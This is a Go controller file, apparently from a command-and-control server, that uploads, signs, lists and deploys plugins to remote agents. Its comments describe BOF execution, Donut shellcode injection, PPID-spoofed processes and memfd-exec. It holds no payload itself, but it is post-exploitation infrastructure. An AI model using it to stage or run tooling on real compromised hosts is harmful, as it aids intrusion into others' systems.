package controllers

import (
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/gin-gonic/gin"

	"cupcake-server/pkg/paths"
	"cupcake-server/internal/service"
)

// sanitizeFileName removes path traversal components and unsafe characters from a filename.
// It strips directory separators and returns only the base name.
func sanitizeFileName(name string) string {
	name = filepath.Base(name)
	name = strings.ReplaceAll(name, "..", "")
	name = strings.ReplaceAll(name, "/", "")
	name = strings.ReplaceAll(name, "\\", "")
	return name
}

func HandleListPlugins(c *gin.Context) {
	plugins, err := services.LoadPluginManifest()
	if err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	// Enrich with 插件能力 flags + required L2 module (模块能力 dependency).
	out := make([]services.PluginMetadata, 0, len(plugins))
	for _, p := range plugins {
		cp := p
		services.EnrichPluginCapabilities(&cp)
		out = append(out, cp)
	}
	c.JSON(http.StatusOK, out)
}

func HandleRunPlugin(c *gin.Context) {
	var req struct {
		UUID     string `json:"uuid"`
		AgentID  string `json:"agent_id"` // Support both uuid and agent_id
		PluginID string `json:"plugin_id"`
		Args     string `json:"args"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(400, gin.H{"error": "Invalid input"})
		return
	}

	// Use AgentID if UUID is empty
	targetUUID := strings.TrimSpace(req.UUID)
	if targetUUID == "" {
		targetUUID = strings.TrimSpace(req.AgentID)
	}

	if targetUUID == "" {
		c.JSON(400, gin.H{"error": "uuid or agent_id is required"})
		return
	}

	fmt.Printf("[Debug] Running plugin %s on agent %s\n", req.PluginID, targetUUID)

	taskID, err := services.DeployPlugin(targetUUID, req.PluginID, req.Args)
	if err != nil {
		if services.IsModuleRequired(err) {
			mod := services.ModuleRequiredID(err)
			if mod == "" {
				mod = "bof"
			}
			c.JSON(http.StatusConflict, gin.H{
				"error":      err.Error(),
				"error_code": "module_required",
				"code":       "module_required",
				"module":     mod,
				"hint":       "BOF 插件依赖模块能力 bof，请先在「模块」页推送",
			})
			return
		}
		msg := err.Error()
		if strings.Contains(msg, "offline") {
			c.JSON(http.StatusConflict, gin.H{"error": msg, "code": "agent_offline", "error_code": "agent_offline"})
			return
		}
		if strings.Contains(msg, "not found") {
			c.JSON(http.StatusNotFound, gin.H{"error": msg, "code": "not_found", "error_code": "not_found"})
			return
		}
		c.JSON(http.StatusBadRequest, gin.H{"error": msg})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "success", "task_id": taskID})
}

// MaxPluginUploadBytes is the per-plugin upload ceiling.
const MaxPluginUploadBytes int64 = 64 << 20 // 64 MiB

func HandleUploadPlugin(c *gin.Context) {
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(400, gin.H{"error": "File is required"})
		return
	}

	if file.Size > MaxPluginUploadBytes {
		c.JSON(http.StatusRequestEntityTooLarge, gin.H{
			"error":     "plugin file too large",
			"max_bytes": MaxPluginUploadBytes,
		})
		return
	}

	pluginID := c.PostForm("id")
	name := c.PostForm("name")
	desc := c.PostForm("description")
	// type is optional — auto-detected from file content
	execType := strings.TrimSpace(c.PostForm("type"))
	osReq := c.PostForm("required_os")
	category := c.PostForm("category")

	if pluginID == "" {
		pluginID = fmt.Sprintf("PL-%d", time.Now().Unix())
	}

	os.MkdirAll("assets/plugins", 0755)
	// Disk/quota gate before write (same reserve as agent transfer uploads).
	if err := services.CheckDiskForWrite("assets/plugins", file.Size); err != nil {
		c.JSON(http.StatusInsufficientStorage, gin.H{
			"error":          "insufficient disk space",
			"min_free_bytes": services.MinFreeDiskBytes(),
		})
		return
	}
	safeFileName := sanitizeFileName(file.Filename)
	if safeFileName == "" || safeFileName == "." {
		c.JSON(400, gin.H{"error": "Invalid file name"})
		return
	}
	savePath := filepath.Join("assets/plugins", safeFileName)
	if err := c.SaveUploadedFile(file, savePath); err != nil {
		c.JSON(500, gin.H{"error": "Failed to save file"})
		return
	}

	// Auto-detect exec type from magic / PE CLR directory
	raw, err := os.ReadFile(savePath)
	if err != nil {
		c.JSON(500, gin.H{"error": "Failed to read uploaded file"})
		return
	}
	if int64(len(raw)) > MaxPluginUploadBytes {
		_ = os.Remove(savePath)
		c.JSON(http.StatusRequestEntityTooLarge, gin.H{
			"error":     "plugin file too large",
			"max_bytes": MaxPluginUploadBytes,
		})
		return
	}
	fileHash := services.PluginFileSHA256(raw)
	detected := services.DetectPluginExecType(raw, file.Filename)
	// Only honor manual type if explicitly "auto" empty or force; always prefer content
	if execType == "" || execType == "auto" || execType == "自动" {
		execType = detected
	} else {
		// Still override with content-based detection (user request: no manual choice needed)
		execType = detected
	}

	if osReq == "" {
		if execType == "memfd-exec" {
			osReq = "linux"
		} else {
			osReq = "windows"
		}
	}
	if name == "" {
		name = file.Filename
	}
	if category == "" {
		category = "general"
	}

	version := strings.TrimSpace(c.PostForm("version"))
	signer := strings.TrimSpace(c.PostForm("signer"))
	manifest := services.PluginMetadata{
		ID:          pluginID,
		Name:        name,
		Description: desc,
		FileName:    safeFileName,
		Type:        execType,
		RequiredOS:  osReq,
		Category:    category,
		Hash:        fileHash,
		Version:     version,
		Signer:      signer,
	}
	// Auto-sign when trust HMAC key is configured (dev keys or CUPCAKE_TRUST_HMAC_KEY).
	if err := services.SignPluginMetadata(&manifest, raw); err != nil {
		c.JSON(500, gin.H{"error": "Failed to sign plugin: " + err.Error()})
		return
	}

	if err := services.AddPluginToManifest(manifest); err != nil {
		c.JSON(500, gin.H{"error": "Failed to update manifest"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"status":         "success",
		"plugin":         manifest,
		"detected_type":  execType,
		"detection_note": typeDetectNote(execType),
	})
}

func typeDetectNote(t string) string {
	switch t {
	case "native-exec":
		return "识别为原生 PE（如 fscan），将走 PPID 隔离短命进程执行"
	case "execute-assembly":
		return "识别为 .NET 程序集 — 执行已退役：请转 shellcode（如 Donut）后走 inject 模块"
	case "bof-exec":
		return "识别为 COFF/BOF 对象，将走 bof 模块（Agent 进程内经典 BOF）"
	default:
		return "已自动选择执行类型: " + t
	}
}

func HandleDeletePlugin(c *gin.Context) {
	pluginID := c.Param("id")
	fileName, err := services.RemovePluginFromManifest(pluginID)
	if err != nil {
		c.JSON(500, gin.H{"error": err.Error()})
		return
	}
	if fileName != "" {
		safeFileName := sanitizeFileName(fileName)
		if safeFileName != "" && safeFileName != "." {
			os.Remove(filepath.Join("assets/plugins", safeFileName))
		}
	}
	c.JSON(http.StatusOK, gin.H{"status": "success"})
}

func HandleGetPluginResult(c *gin.Context) {
	taskID := c.Param("task_id")
	// Validate task_id: only allow alphanumeric characters to prevent path traversal
	validID := regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)
	if !validID.MatchString(taskID) {
		c.JSON(400, gin.H{"error": "Invalid task ID"})
		return
	}
	logPath := filepath.Join(paths.Join("logs"), fmt.Sprintf("task_%s.txt", taskID))
	data, err := os.ReadFile(logPath)
	if err != nil {
		c.JSON(404, gin.H{"error": "Not found"})
		return
	}
	c.String(200, string(data))
}

